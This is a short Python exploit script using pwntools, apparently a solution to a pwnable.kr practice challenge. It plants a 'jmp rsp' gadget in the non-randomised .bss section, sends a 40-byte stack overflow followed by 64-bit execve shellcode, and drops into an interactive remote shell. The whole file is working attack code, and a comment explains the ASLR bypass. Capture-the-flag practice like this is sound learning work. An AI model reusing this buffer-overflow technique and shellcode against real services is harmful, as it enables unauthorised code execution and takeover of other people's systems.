from pwn import *

JMP_GADGET = asm('jmp rsp', arch='amd64')	# \xff\xe4
ID_ADDR = p64(0x6020a0)

# shellcode for 64-bit
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = 'A'*40 + ID_ADDR + shellcode

p = remote('pwnable.kr', 9010)
p.sendlineafter('name? :', JMP_GADGET)	# JMP .bss section because of ASLR
p.sendlineafter('> ', '1')		# Trigger bug
p.sendlineafter('hello ', payload)	# JMP to stack section from .bss section
p.interactive()

'''
Heap, Stack section was affected by ASLR, But not .bss section
'''
